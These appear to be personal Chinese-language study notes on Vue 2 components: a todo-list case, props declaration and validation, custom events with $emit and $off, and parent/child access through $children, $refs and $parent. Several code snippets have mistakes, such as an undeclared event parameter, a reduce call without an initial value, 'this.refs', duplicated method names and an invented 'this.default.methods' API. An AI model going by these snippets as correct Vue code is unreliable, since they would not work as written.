
  // 子组件  声明接收一个todo
  <span>{{todo.title}}</span>
  props: ['todo']
 -->


> 数据类型中id到底用什么类型的数据比较好？
- 在js中数字型的id是有尽头的 一般都用字符串的类型


> 怎么控制 标签内部的属性 有还是没有
- 或者我们使用三元表达式 
- 在上面的案例中我们直接去问todo.done就可以
<!-- 
  <input type='checkbox' :checked='todo.done'>
 -->


> 按下回车后将用户输入的信息 生成新的一项
- 1. 我们需要将用户的输入包装成一个todo对象
<!-- 
  // 一个todo对象
  {id: '001', title: '喝酒', done: false}

  <input type='text' @keyuo.enter='add'>
  methods: {
    add() {
      const todoObj = {
        id: nanoid(),
        title: e.target.value,
        done: false
      }
    }
  }
 -->

**注意：**
- 正常来说 我们在组织数据结构的时候不用组织id进到对象里 我们只需要整理其它的数据 数据库会自动给我们生成id
- 随机数
- 时间戳
- uuid / nanoid
- 它的算法是你目前所处的地理位置 加上电脑的mac地址 加上你的序列号
<!-- 
  npm i nanoid
  import {nanoid} from 'nanoid'

  nanoid是一个函数 直接调用生成唯一的字符串
 -->

- 2. 将我们包装起来的todoobj添加到数据的数组中就可以了
- 问题： 我们创建的 todoobj 是在 header组件里面 数据在 MyList 组件里面 怎么添加进去呢？可以兄弟组件之间怎么传递数据呢？
<!-- 
  --- MyList      -- 数据的存放位置
      --- MyItem

  --- Header      -- 用户输入 生成的信息obj

  兄弟组件之间怎么传递数据
  - 事件总线
  - 消息发布与订阅
  - vuex
 -->


> 使用reduce方法 总结已完成的数据
- this.todos.reduce((pre, todo) => pre + (todo.done ? 1 : 0))


> □ 已完成2 / 全部3
- 什么时候前面需要打上对号？
- 思路一：
- 已完成 和 全部都使用计算属性来说 我们可以在
<!-- 
  checkbox checked = 变量1 === 变量2 && 变量2 > 0

  也就是说 全部 要大于0 总数大于0并且变量1 2 相等的时候
-->


> 将用户保存的数据 放在本地存储中
- 那什么时候往本地存储里面放呢？ 我们使用watch监视属性 只要我们操作了todos那么我就把它放本地存储中放
<!-- 
  data: {
    // todos: []
    todos: JSON.parse(localStorage.getItem('todos')) || []
  }

  // 我们使用监视属性 监视todos value就是todos最新的值 因为我们在添加的时候是将用户输入的信息整理成一个对象 然后使用vue认可的数组的方法 unshift 插入到数组中的

  // 这样添加进本地存储的都是最新的值

  // 如果修改内部对象里面的属性的时候 我们就开启深度监视
  watch: {
    todos: {

      deep: true

      handler(value) {
        localStorage.setItem('todos', JSON.stringify(value))
      }
    }
  }
 -->


> 编辑每一个todo项的内容
- 我们给每一行 todo 都添加一个编辑按钮 用于修改 睡觉
- 当处于修改状态的时候 睡觉应该出现在一个input里面 当结束修改的时候 变成正常状态
<!-- 
  □ 睡觉    ----   编辑  删除


  我们在写 checkbox 是否勾选的时候 使用的是一个变量来控制它是否选中 todo.done 来控制的
  {
    id: nanoid(),
    title: e.target.value,
    done: false
  }

  现在我们要控制 文本是否处于编辑状态 也可以添加一个属性 
    isEdit为真 睡觉应该处于一个input里面 
    isEdit为假 正常显示文字
  {
    isEdit: false

    id: nanoid(),
    title: e.target.value,
    done: false
  }
 -->

- 两个结构只有一个显示 根据一个变量控制 另一个使用v-if将变量取反
<!-- 
  <div v-if='!isEdit'>{{name}}</div>
  <div v-if='isEdit'><input type="text" :value='name'></div>
 -->


**注意：**
- 往对象中添加属性的时候 我们要是想要响应式 也就是让vue监测到要使用
- this.$set(todo, "isEdit", true)


> 当点击编辑按钮后 输入框内的文本自动获取焦点
- 当我们如下操作的时候 并没有获取焦点
- 为什么？
<!-- 
  handle() {
    if(todo.hasOwnProperty('isEdit')) {
      todo.isEdit = true
    }

    this.$refs.inputTitle.focus()
  }


  // 我们的逻辑是：
  逻辑是我们判断todo对象中有没有isEdit 如果有代表应该将 文本变为input框 + 文本的格式

  todo.isEdit = true
  当我们将isEdit设置为true的时候 vue就会监测到然后vue就会立刻的帮我们解析模板 然后input框就会出来了 然后我们执行这段代码
  this.$refs.inputTitle.focus()

  input框就会获取焦点


  // 但是真实的流程是这样的
  todo.isEdit = true 这句话之后 Vue并没有马上帮我们解析模板 Vue是继续往下走 走了这句话 this.$refs.inputTitle.focus() 然后解析模板

  由于html结构的部分我们是用v-show控制着input的出现 走这句话的时候
  this.$refs.inputTitle.focus()

  input框还没有来到页面

  Vue是将里面所有的代码执行完毕才会解析模板
 -->

**Vue会将一个回调中的代码全部执行完毕才会去解析模板**
> 解决方式1：
- 使用延时定时器：
<!-- 
  setTimeout(function() {
    this.$refs.inputTitle.focus()
  }, 200)
 -->

> 解决方式2：
> this.$nextTick(callback)
- $nextTick指定的回调会在dom节点更新后才会执行
<!-- 
  this.$nextTick(function() {
    this.$refs.inputTitle.focus()
  })

  Vue会在模板解析完毕之后再调用里面的函数 这样就能保证会在节点更新后再去触碰节点
 -->


> 总结
- 组件化的编码流程
- 1. 拆分静态组件 组件要按照功能点拆分 命名不要与html元素冲突
- 2. 实现动态组件 考虑好数据的存放位置 数据是一个组件在用 还是一些组件在用
  - 一个组件在用 放在组件自身即可
  - 一些组件在用 放在他们共同的父组件上这也是状态提升

- 3. props适用于
 - 父组件 -- 子组件 通信
 - 子组件 -- 父组件 通信 要求父先给子一个函数

- 4. 使用v-model的时候要切记 v-model绑定的值不能是props传递过来的值 因为props是不可以修改的

- 5. props传过来的若是对象类型的值 修改对象中的属性时 vue不会报错 但不推荐这么做

--------------------------

### Github案例部分的总结

> 引入外部样式库
- 项目中需要引入外部的ui库的时候 我们通常有2种方式存放ui样式库

> 将ui样式库存放在src文件夹下
- 1. 在 src 文件夹内部创建 assets 文件夹 将boorstrap放入其中
- 2. 在 App 组件 script部分 引入 boorstrap css样式
<!--  
  <script>
  import ./assets/css/bootstrap.css'

  export default {
    name: 'App',
 -->

**注意：**
- 如果将样式库存放在 src / assets / 的时候 我们引入该样式就必须通过
- import 引入
- 通过 import 引入的文件 webpack会严格的检车内部文件情况 以及依赖关系 如果存在问题会报错


> 将ui样式库存放在public文件夹下
- 1. 在 public 文件夹下创建css文件夹 将boorstrap放入其中
- 2. 在html文件中 通过 link标签引入
<!-- 
  <link 
    rel="stylesheet" 
    href="<%= BASE_URL %>css/bootstrap.css"
  >
 -->


> List组件 要根据请求数据的情况 呈现不同的信息
- 1. welcome
- 2. loading
- 3. users
- 4. 网络错误页面

- 我们不能根据 users数组的长度去判断是否要展示loading
- 1. 因为页面上上来 users数组的长度就是0 但是我们要展示的是welcome
- 2. 如果网络错误请求回来的数据为空 users数组的长度也是0 但我们要展示的是网络错误页面

- 我们需要在 data 中设置也几个标识的变量
<!-- 
  data: {
    isFirst: true
    isLoading: false    // 当点击搜索按钮的时候才是正在加载
    errMsg: ''
    users: []
  }

  页面上展示什么 根据上面的变量来决定 比如

  // 展示用户数据
  <div v-show='users.length'>

  // 展示欢迎词
  <div v-show='isFirst'>

  // 展示加载中
  <div v-show='isLoading'>

  // 展示错误信息
  <div v-show='errMsg'>
 -->


- 上面的4个标识状态需要随着请求的发送 发生变化
- 情况1
- 当我点击搜索按钮之后 这些值应该是什么样的？
<!-- 
  data: {
    isFirst: false      // 点按钮了 该状态 就不需要 欢迎词了 false
    isLoading: true     // 点按钮了 该状态 就是加载中 true
    errMsg: ''
    users: []
  }
 -->


> 当 一个对象中有4个属性 另一个对象中有3个属性 我想保留多出的一个属性 只替换重名的三个属性
<!-- 
  this.info = {...this.info, ...dataObj}
 -->

--------------------------

### vue-resource
- 我们前面都是使用 axios 等库发送的请求 
- vue-resource 是一个插件库
- 现在这种方式用的不多了 我们作为了解

> 使用方式：
- 1. npm i vue-resource
- 2. 在main.js文件中 注册刚才下载的 vue-resource
<!-- 
  import Resource from 'vue-resource'
  Vue.use(Resource)
      // 注册后 所有的vm vc身上都会多了一个 $http
 -->


> this.$http.get / post
- 这个 vue-resource 身上方法 用法 返回值 跟axios是一模一样的

--------------------------

### 组件之间的通信
- 下面就是组件之间的通信 我们将下面结构分成什么样 的组件? 
- 组件之间的通信就是数据之间的传递

------------------
|                |
|                |   -- > 轮播图
------------------

------------------
|                |
|                |  -- > 开发相关
------------------

------------------
|   ----------   |
|  |          |  |
|   ----------   |
|                |
|   ----------   |  -- > 列表部分 成
|  |          |  |       内部有小组件 小组件可以通过v-for遍历生成
|   ----------   |
|                |
|   ----------   |
|  |          |  |
|   ----------   |
------------------

- 1. 一个组件
- 2. 一个组件
- 3. 一个组件
  - 3.1 内部有3个列表
    - 3.1.1. 当我们开发列表的时候肯定是先向服务器发送请求, 请求列表数据, 那请求列表数据这个动作(相关的请求代码)在哪里请求比较好?
    <!-- 
      整体是一个组件 3的列表部分是一个组件, 3列表里面又是小组件, 那请求相关的代码放在哪里比较合适
      一般情况下 我们会在最外层最大的组件(也就是说包裹上面3个大组件的整体组件)内部写上发送请求的相关代码

      发送请求后 我就能在最外层最大的组件内容拿到返回的数据了, 拿到数据后 我可以把数据存放在最外层最大的data里面 比如我们拿到的数据叫做 productList 一个商品列表

      但是有一个问题, 我们最外层最大拿到的这个数据并不是它自己要使用的 而是交给下面第三个组件列表部分展示的 它才是最终展示列表的地方

      这个时候我们就要做一个事情, 就是从我们请求到的 productList 数据传递给 3这个组件 只有传递过去后 才能在下面使用v-for的指令生成结构 变量

      v-for='(item, index) of productList'
      然后再把item传递给3中的小组件, 让小组件根据item来创建一个个的列表结构
     -->


- 在上一节中, 我们提到了子组件是不能引用父组件或者Vue实例的数据的
- 但是, 在开发中, 往往一些数据缺失需要从上层传递到下层
  - 比如一个页面中, 我们从服务器请求到了很多的数据
  - 其中一部分数据 并非是我们整个页面的大组件来展示的, 而是需要下面的子组件进行展示
  - 这个时候, 并不会让子组件再次发送一个网络请求, 而是直接让大组件(父组件)将数据传递给小组件(子组件)


> 如果进行父子组件之间的通信
- 父 - > 子： 通过 props 向子组件传递数据
- 子 - > 父： 通过事件(自定义事件)向父组件发送消息

          --- Pass Props --- >    

  Patent(父组件)        child(子组件)

        < --- $emit Events --- 

- 在真是的开发中, Vue实例和子组件的通信和父组件和子组件的通信过程是一样的

--------------------------

### 组件之间的传递 父 传 子
### 配置项 props
- props用于父子组件的相互通信也就是传递数据

- 该方式类似于微信转账 我这边给你转账 你需要点击确认收款 映射到props上就是 父组件向子组件传递数据，子组件要确认接收该数据


- 应用场景1：
- 我们创建了一个组件 希望组件中的内容 是根据父组件传递的数据决定的
- 也就是组件在复用 数据是动态的


> 使用方式1 确认接收方(子组件)的props为数组  简单声明接收
- 1. 父组件在组件标签内部传递数据

- 父组件在组件标签内传递数据时 有两种书写方式：
    - 1. 可以直接传递      key: value    
    - 该种情况传递的只能是字符串

    - 2. 可以使用v-bind   :key: value
    - 该种情况传递的数据可以‘表达式执行的结果’ 还可以传递组件实例对象中的data中的数据
<!-- 
  <Student name='我是小暖暖' age='18'/>
      // 这么传递 子组件接收的都是字符串

  <Student :name='name' :age='18'/>
      // 这么传递 即可以传递在data中的数据  也可以传递数字类型的数据
 -->

- 2. 子组件使用props配置项确认接收 props的为数组 内部写父组件传递数据时使用的变量名
- 父组件传递的数据会被收集在组件的实例对象上(vc) 也就是说只要vc身上有的属性 模板中都可以直接使用
<!-- 
  props: ['name', 'age']
 -->


> 使用方式2 确认接收方(子组件)的props为对象  配合类型限制 和 默认值
- 父组件传递数据的部分和上面的相同 但是在接收的同时可以对数据的类型做限制

> 简单的类型限制
- 子组件在接收的时候 props配置项为对象
- props: {
  接收数据的变量: String,
  接收数据的变量: Number,
}
<!-- 
  props: {
    name: String,
    age: Number
  }
 -->

> 完整的类型限制 可以设置必传项 和 默认值
- 子组件在接收的时候 props配置项为对象 同时每一个接收数据的变量的类型也是一个对象 用于配置更加丰富的限制信息
- props: {
  接收数据的变量: {
    type: String,
    required: true,
    default: 'sam'
  }
}

- 一般情况下 required 和 default 不会同时出现
<!--  
  props: {
    name: {
      type: String,
      required: true,
      default: 'sam'
    }
  }
 -->
- 当 type 为 Array Object 的时候 default必须是一个函数且返回值就是默认值
<!-- 
  props: {
    person: {
      type: Array,

      default: () => []

      default() {
        return []
      }
    }
  }
 -->

- 数组的默认值
<!-- 
  default: () => []
 -->

- 对象的默认值
<!-- 
  default: () => ({})
 -->

- 函数的默认值
<!-- 
  default: () => {}
 -->


> 限制属性：
- type:     接收数据的数据类型 / 父组件传递进来的数据类型

- default:  
    当模板中没有使用接收的数据时, 默认显示的数据注意type是什么类型, defaule就得写什么类型的值, 

- required:true
    当为true时, 父组件必须传递这个属性


> 自定义props的规则
- 传递的属性值中必须是下面字符串中的一个
<!-- 
  validator: function(value) {
    return ['succsess', 'warining', 'danger'].indexOf(value) !== -1
  }
 -->

- 我们还可以自定义函数用来验证别的类型(列表中没有的类型)
<!-- 
  function Person(firstName, lastName) {
    this.firstName = firstName,
    this.lastName = lastName
  }

  Vue.component('blog-post', {
    props: {
      author: Person(上面必须都是array object 我们自定义个类型Person)
    }
  })
 -->


> 不仅能传递数据 还能传递方法
<!-- 
  // 父组件中
  在父组件标签内使用v-bind  父组件定义方法 子组件通过 props 传递到子组件
  <app :addComment='addComment'>

  methods: {
    addComment(comment) {
      this.comments.unshift(comment)
    }
  }

  // 子组件:
  props: {
    addComment: {
      type: Function,
      required: true
    }
  }

  methods: {
    在子组件中通过this调用
    this.addComment(comment)
  }
 -->


> props中 函数的默认值
- 函数的默认值可以通过 this.default.methods 来获取
<!-- 
  default: (event) => {
    this.default.methods.sayHi();
  }
 -->

> props数据类型的验证都支持哪些数据类型呢?
  - String
  - Number
  - Boolean
  - Array
  - Object
  - Date
  - Function
  - Symbol

- 当我们有自定义构造函数时, 验证也支持自定义的类型


> 注意：
- 1. 子组件在声明接收的时候 父组件没有传递的属性 不要声明接收 就是不要瞎声明
- 2. 接收到的props是不推荐改的 当它们是只读属性 要不vue会产生一些奇奇怪怪的问题
- 3. 父组件在组件标签内部传递数据的变量 不能使用vue中预定义的变量名

- 4. 当类型type是对象object 或者数组的时候 array
- 默认值default必须是一个函数 里面return一个数组 或者 对象
<!-- 
  props: {
    cmovies: {
      type: String,
      default: 'aaa',     // 这样不行 改成

      default() {
        return [] or {}   // 这样的形式才可以
      }
    }
  }
 -->

- 5. props的优先级高 它会覆盖掉data computed里面的同名数据

### 书签

--------------------------

### 组件之间的传递 子 传 父
### 方式1：通过props 使用父组件的事件函数
- 有些时候 我们需要子组件向父组件传递数据 那么怎么做呢

> 1. 利用props向子组件先传递函数 
> 2. 子组件将数据通过实参传递到函数里 父组件通过形参接收

- 1. 父组件中定义函数准备接收数据
- 2. 父组件将定义的函数使用props的方式发送到子组件
- 3. 子组件声明接收父组件发送过来的函数 将数据通过实参传递 父组件使用形参接收
<!-- 
  // 父组件
  <App>
    <MyHeader> </MyHeader>
    <MyList :receive='receive'> </MyList>
  </App>


  methods: {

    // receive英语是接收的意思
    receive(todoObj) {
      // todoObj 就是 子组件 传递过来的数据
    }
  }


  // 子组件
  props: ['receive']    // 这里是父组件传递过来的函数
  methods: {

    // 子组件中的事件逻辑内部 调用父组件传递过来的事件
    add(e) {
      // 我们将这个数据 送回父组件
      const todoObj = {id:nanoid(), title: e.target.value, done: false}

      this.receive(todoObj)
    }
  }
 -->

--------------------------

### 组件之间的传递 子 传 父
### 方式2：组件自定义事件
-  这节里面我们研究一下 组件自定义事件 上面子组件交给父组件数据的时候使用的props传递函数

- 需求：
- 嵌套组件，当点击存放在子组件中的按钮 将子组件的 数据 交给它的父组件

> 要点: $emit('发射的事件名', [数据])
> 要点: 父组件在接收数据的时候可以 形参里面是(name, ...a)
- 用于接收除了name以外的剩余参数

> 1. 父组件中在子组件标签内部使用 v-on绑定 子组件的自定义事件
- 比如：
- 下面是给Student组件实例对象vc身上绑定了一个atguigu事件，如果有人触发了这个事件 demo函数就会被调用
<!-- 
  <App>
    <Student v-on:atguigu='demo'/>

    // 只触发一次
    <Student @atguigu.once='demo'/>
  </App>
 -->

**给子组件绑定事件的另一种方式：**
- 该灵活性比较强 比如我可以等ajax请求回来后再去给子组件绑定事件
<!-- 
  <Student ref='student'/>
  mounted() {
    this.refs.student.$on('子组件自定义事件名', 父组件中的回调)
  }

  // 只触发一次
  mounted() {
    this.refs.student.$once('子组件自定义事件名', 父组件中的回调)
  }
 -->


> 2. 子组件在按钮的回调中 使用 this.$emit('自定义事件名') 来将事件发射出去
- 我们还可以在第二个参数的位置 传递数据 传递的数据父组件在methods中直接定义形参接收即可



> 自定义事件的解绑：
- 我们在哪里使用$emit发射的事件 就在哪里解绑事件

> this.$off('自定义事件名')
- 只能解绑一个事件

> this.$off(['自定义事件名1', '自定义事件名2'])
- 只能解绑指定事件

> this.$off()
- 只能解绑全部事件


**注意问题**
- 1. 我们接收子组件通过自定义事件传递过来的数据的时候 要将数据保存在data中 然后我们才能在模板中使用

- 2. 
  


> 应用场景
- 比如 现在一个网页中的分类侧边栏 里面有很多的选项

    热门推荐
    手机数码
    电脑办公
    计生情趣
    美容护肤

<!-- 
  - 像在这个小组件上的数据 其实都是从服务器获取的吧, 也就是说 我们外层最大的组件发送请求 将获取到的数组 传递给这个子组件, 在子组件中展示

  - 但是这时候 因为里面有很多的选项, 比如页面上来的内容 属于 热门推荐里面的 这时我 点击了 手机数码, 应该显示手机数码里的内容了

  - 这时候就要告诉父组件 子组件点击了谁 子组件里有很多的类别 我到底点击了哪一个类别呢
  - 如果我点击了 手机数码的类型, 父组件知道了后应该请求手机数码的数据 
  - 如果我点击了 手机数码的类型, 父组件根据家电家器的类型请求对应数据

  - 所以子组件里发生了事件, 我们告诉父组件发生了什么样的事件, 并且要告诉父组件 现在发生的事件 点击的数据是谁 得给父组件传递过去

  - 因为给父组件传递过去, 父组件就能拿到一个变量 category = 'phone', 然后根据phone把phone发送到服务器去请求新一轮的数据
 -->


> 具体流程
> 1. 子组件内定义数据
<!-- 
  data() {
    return {
      // 定义要展示在页面中的数据
      categaries: [
        // 到时候我们把id传递到服务器 一般不需要传递名字的
        {id: 'aaa', name: '热门推荐'},
        {id: 'bbb', name: '手机数码'},
        {id: 'ccc', name: '电脑办公'},
        {id: 'ddd', name: '家用加点'},
      ]}}
 -->

> 2. 在子组件的模板里进行展示
  <template id='cpn'>
    <div>
      <!-- 将子组件中的数据, 展示到子组件的模板里 -->
      <button v-for='item of categaries'>{{item.name}}</button>
    </div>
  </template>

> 3. 点击 手机数据 请求对应对应数据
- 通过:
- 自定义事件
- $emit('发射的事件名', 参数)
<!-- 
  我需要告诉父组件点了谁 父组件 再根据我点击了谁请求对应的数据
  那我就要监听按钮的点击 并且把item传递进子组件中的方法里 这样才能拿到item的id
 -->

  <div>
    <button v-for='item of categaries' @click='itemClick(item)'>{{item.name}}</button>
  </div>

<!-- 
  既然在子组件的模板里 绑定了 点击事件, 那就在子组件内 methods属性中, 做事件的处理函数

  我们给按钮绑定了点击事件后 点击按钮, 因为把item传递到子组件里方法里, 所以子组件的内部就知道了 点击了谁

  但是不够, 应该是父组件知道了点击了谁 根据点击了谁去请求新的数据
  这时候我们就要把点击了谁告诉父组件了 怎么传? 通过自定义事件
-->

<!-- 
    methods: {
      // 参数, 发射事件的名称, 把item作为参数传递过去
      itemClick(item) {
        this.$emit('itemclick', item)
      }}}
 -->

- 我们把 itemclick 事件发送出去了, 父组件就要监听这个事件(子组件发射事件, 父组件接收事件)
- 父组件怎么接收 监听这个事件?

> 要点:
<!-- 
  $emit() 发送的事件名 最好都是小写 或者可以加 - 分割 item-click
  在html部分里 不要使用驼峰标识符 html不认识
 -->


> 5. 父组件接收子组件发射出来的事件
  <div id="app">
    <cpn v-on:itemclick='cpnClick'></cpn>
  </div>

- 既然在被管理区域内绑定了cpnClick事件 那么就在父组件的methods属性里进行处理
<!-- 
  cpnClick 在默认事件中 没有传递参数 会默认的把event对象传递过来
  但是在自定义事件中, 因为这个自定义事件 不是浏览器的事件对象 所以默认会传item
 -->

> 要点:
- 要使用子组件传递过来的数据时, 不用 
<cpn v-on:itemclick='cpnClick'></cpn>
<!-- 
  const app = new Vue({
    el:'#app',
    data: {
      message: ' 一切都会好的',
    },
    components: {
      cpn
    },
    methods: {
      cpnClick(item) {
        console.log(item)
      }}})
-->

> 总结：
- 上面介绍了两种方式 子组件和父组件之间的通信 
- 相同点：
- 父组件中都要配置回调用户接收数据


--------------------------

### 案例 汇率转换? 父子组件通信
- 需求:
- 1. 子组件中使用父组件的变量数据
- 2. 在子组件的模板中添加input标签 双向绑定子组件中的数据, 达到修改input的值可以影响到子组件中data中的变量, 同时还会修改父组件中的变量
- 3. 在输入框1中输入数字 输入框2中的数字是输入框1中的100倍, 输入框2中数字是输入框中的1/100

---

> 1. 在父组件中的data属性中, 创建子组件需要使用的变量, 并注册子组件
> 2. 在子组件中的props属性里创建变量, 用于接收父组件传递过来的数据
> 3. 在子组件的模板中使用props属性里创建变量
> 4. 在被管理区域内调用<cpn /> 并在内部使用v-bind:子组件变量名='父组件data中的数据'

> 5. 基本结构已经搭建好了 接下来实现需求, 在子组件的模板中创建input标签, 双向绑定子组件中的cnum1, cnum2对应的数据
- props属性中的变量 用在展示的话没问题, 但是用来修改的话请创建data() {}

- 复习知识, 如果是子组件创建变量 数据等 要通过data() {}的方式 作用域的关系

- 在data函数中创建新的变量 让props的属性中的变量 赋值给data中创建的新的变量
<!-- 
  为了解决上面的需求, 我使用了v-model 双向绑定了 子组件中props里对应的变量值
  可以实现修改文本框的值从而影响到, 子组件中props里对应的变量值

  但是报错了
  错误提示:
  如果动态修改子组件props中的变量的话, 请一定通过父组件来修改
  因为子组件中props属性是用来接收父组件中的数据的 用来展示可以 但是要是修改的话不行

  因为props最终的目的是让父组件给它传数据, props中变量的数据修改的话应该是来自父组件, 父组件传递过来什么值, props中的变量就是什么值

  如果修改子组件props中的属性的话, 书写起来会很乱, 而且两个地方(input的双向绑定 和 父组件的修改)同时这么做的话 这个数值有可能是会乱套的


  <template id='cpn'>
    <div>
      <h3>{{cnum1}}</h3>
      <input type="text" v-model='cnum1'>
      <h3>{{cnum2}}</h3>
      <input type="text" v-model='cnum2'>
    </div>
  </template>
 -->

> 6. 在子组件中创建data函数, 用来创建新的变量来接收props属性中变量的值
<!-- 
  const cpn = {
    template: '#cpn',
    props: {
      cnum1: Number,
      cnum2: Number
    },
    data() {
      return {
        dnum1: this.cnum1,
        dnum2: this.cnum2
      }
    }
  }
 -->

> 7. 不使用v-model的形式, 我们使用 :value='data函数中的新变量' + @input的方式
- :value='data函数中的新变量' 的方式 能实现单向操作 修改父组件的变量num1的值 会影响到 界面上的数据
num1 = cnum1 = dnum1 界面上显示的是dnum1

> 8. 通过input的事件, 监听input的情况 实时赋值给 子组件data函数的变量
- 到这里就实现了v-model的功能, 修改文本框内的数据会影响到子组件data函数中的自定义变量dnum, 但是还没有实现, 影响到子组件props属性中用于接收父组件数据的变量
<!-- 
  <input type="text" :value='dnum1' @input='num1Input'>
  <input type="text" :value='dnum2' @input='num2Input'>

  因为没有传递实参 所以默认是传递了event事件对象 应用event.target相当于this

  const cpn = {
    template: '#cpn',
    props: {
      cnum1: Number,
      cnum2: Number
    },
    data() {
      return {
        dnum1: this.cnum1,
        dnum2: this.cnum2
      }
    },
    methods: {
      num1Input(event) {
        this.dnum1 = event.target.value
      },
      num2Input(event) {
        this.dnum2 = event.target.value
      }
    }
  }
 -->

> 9. 我们要把从文本框获取的数据, 传回到父组件中 所以应用到了 $emit() 发射事件
- 我们需要把从文本框里获取到的文本实时发射出去, 让父组件来监听获取参数
- 父组件需要在被管理区域的cpn标签内部绑定自定义事件 来监听获取子组件传递过来的参数
- 我们还要父组件中定义处理方法 把获取到的参数赋值给data中的变量

- 但是默认情况下 input里面的值都是string类型 所以会报类型的错误 我们可以做下类型的转换

<!-- 
  <div id="app">
    <cpn :cnum1='num1' :cnum2='num2' @num1inputchange='num1inputchange' @num2inputchange='num2inputchange'></cpn>
  </div>

  const cpn = {
    template: '#cpn',
    props: {
      cnum1: Number,
      cnum2: Number
    },
    data() {
      return {
        dnum1: this.cnum1,
        dnum2: this.cnum2
      }
    },
    methods: {
      num1Input(event) {
        this.dnum1 = event.target.value;
        // 实时把从文本框里获取到的文本发射出去, 让父组件来监听获取参数
        this.$emit('num1inputchange', this.dnum1);
      },
      num2Input(event) {
        this.dnum2 = event.target.value;
        this.$emit('num2inputchange', this.dnum2);
      }
    }
  }

  const app = new Vue({
    el:'#app',
    data: {
      num1: 3,
      num2: 1
    },

    components: {
      cpn
    },

    methods: {
      num1change(value) {
        this.num1 = Number(value);
      },
      num1change(value) {

        // 但是默认情况下 input里面的值都是string类型 所以会报类型的错误 我们可以做下类型的转换
        this.num2 = Number(value);
      }
    }
  })
 -->

> 10. 以上就实现了 修改文本框的值 会同时修改子组件中的data函数中的变量 dnum1 -- 然后又通过$emit()发射出去了事件和dnum1的参数, 父组件来创建事件来处理接收子组件发射出来的自定义函数 
- 然后子组件拿到了dnum1这个数据, 赋值给父组件中data中的变量num1


> 11. 在文本框1中输入的数值, 在文本框2中呈现的是文本框1的100倍
> 12. 在文本框2中输入的数值, 在文本框1中呈现的是文本框2的1/100
- 要实现上面的两点, 还是要在子组件的methods方法中继续写逻辑
<!-- 
  const cpn = {
    template: '#cpn',
    props: {
      cnum1: Number,
      cnum2: Number
    },
    data() {
      return {
        dnum1: this.cnum1,
        dnum2: this.cnum2
      }
    },
    methods: {
      num1Input(event) {
        this.dnum1 = event.target.value;
        // 实时把从文本框里获取到的文本发射出去, 让父组件来监听获取参数
        this.$emit('num1inputchange', this.dnum1);

        // 我们把修改过后的数据再次发射出去, 再让父组件来接收, 再重新传递回来
        this.dnum2 = this.dnum1 * 100;
        this.$emit('num1inputchange', this.dnum2);
      },
      num2Input(event) {
        this.dnum2 = event.target.value;
        this.$emit('num2inputchange', this.dnum2);

        // 这个逻辑里dnum2也发生了变化, 我们也给它发射出去 让父组件知道
        this.dnum1 = this.dnum2 / 100;
        this.$emit('num1inputchange', this.dnum1);
      }
    }
  }
 -->

--------------------------

### 父访问子 $children  $refs
- 前面我们了解了父子组件中如果传递数据, 但有些情况是 在父组件里面能拿到子组件的对象然后直接操作子组件里面的一些东西(就不是两者之间传递东西了)
- 比如我拿到子组件里面的对象, 然后直接调用子组件对象中的方法

- 或者说子组件里面去拿父组件里面的对象调下父组件里面的方法或属性
- 通过对象直接访问的

> 父组件访问子组件: 使用 $children 或 $resf 
<!-- 
  这么记好不好 访问谁 $后面跟着就是谁 访问父 $parent 访问子 $children
 -->
> 子组件访问父组件: 使用 $parent


### $children的访问
- this.$children是一个数组类型, 它包含所有子组件对象(页面中的所有子组件)

> $children的缺陷
- 通过$children访问子组件时, 是一个数组类型, 访问其中的子组件必须通过索引值
- 但是当子组件过多, 我们需要拿到其中一个时, 往往不能确定它的索引值, 甚至还可能发生变化
- 有时候, 我们想明确获取其中一个特定的组件, 这个时候就可以使用 $refs


> $children 的使用方法
- 访问方法
- this.$children[0].showMessage()

- 访问属性
- this.$children[0].num


> 案例 当页面中只有一个组件时, 使用 $children 访问父组件中的方法和属性
- 需求 点击按钮后 使用子组件中的方法输出语句

- 当我点击按钮的时候 就打印子组件里面的内容 由于下面这里是被管理区域 我们在这里监听的事件的处理函数应该在vue实例也就是父组件里面

- 在父组件的methods中的处理函数中 也就是在vue实例也就是父组件中访问子组件里的内容
- 我们可以通过第一种方式 $children 的方式访问子组件 它是一个数组 所有的子组件都装在这个数组里面

- 弊端: 
- 页面中不仅是一个子组件可能有很多 不能确定索引 索引还会变
<!-- 
  <div id="app">
    <cpn></cpn>
    <button @click='btnClick'>点击</button>
  </div>

  const app = new Vue({
    el:'#app',
    data: {
      message: '一定会好的'
    },

    components: {
      cpn
    },

    methods: {
      btnClick() {
        // console.log(this.$children)   //[VueComponent]

        // 既然有这个对象 那我们就可以这样
        // this.$children[0].showMessage();

        // 我们还可以通过$children访问子组件中的属性
        let result = this.$children[0].num;
        console.log(result)
      }
    }
  })
 -->


### $refs的使用
> this.$refs.refname.属性名

- $refs 和 ref指令通常是一起使用的
- 首先 我们通过ref给某一个子组件绑定一个特定的id
- 其次, 通过this.$refs.refname就可以访问到该组件了

> 使用ref 和 $refs.id.属性名的方式 访问子组件中的属性 或 方法
- $refs默认是一个空的对象($refs是一个对象类型)
<!-- 
  <div id="app">
    // 在组件上添加 ref属性
    <cpn ref='aaa'></cpn>
    <button @click='btnClick'>点击</button>
  </div>

    methods: {
      btnClick() {
        // 默认的$refs是一个空的对象, 它必须和ref配合使用 使用ref在组件上添加类似id的值
        console.log(this.$refs.aaa.num)
      }
    }
  })
 -->

> 总结
- 获取所有子组件的时候使用 $children
- 获取某一个组件的时候使用 ref 和 $refs

--------------------------

### 子访问父 $parent
- 但是我们在实际开发中并不太会使用 $parent 获取数据后使用
<!-- 
  因为我们组件型的开发核心是复用性, 也就是说我们开发的一个一个组件可以自由的在任何文件页面内使用, 所以要保持它的独立性, 如果我们使用了$parent的话 组件和组件之间就会相互关联, 不方便复用, 耦合性太高 
-->

<!-- 
  <div id="app">
    <cpn></cpn>
  </div>

   <template id='cpn'>
    <div>
      <h3>我是子组件</h3>

      // 子组件中的按钮对应的处理函数应该在子组件的methods内
      <button @click='btnClick'>点击</button>
    </div>
  </template>

  const cpn = {
    template: '#cpn',
    methods: {
      btnClick() {

        // 在这里我们要访问父组件 通过$parent

        // Vue 因为这个子组件的父组件就是vue实例 如果是父组件(不是根组件)的话会是VueComponent
        console.log(this.$parent)
        console.log(this.$parent.message)
      }
    }
  }
 -->

--------------------------

### 访问根组件(Vue实例) $root
- $root可以访问到Vue实例中的属性和方法
- this.$root.message

- 一般Vue实例里面什么也没有 只有一些重要的东西, 这个属性用的也很少
<!-- 
  const cpn = {
    template: '#cpn',
    methods: {
      btnClick() {
        console.log(this.$root.message)
      }
    }
  }

  const app = new Vue({
    el:'#app',
    data: {
      message: '一定会好的'
    },
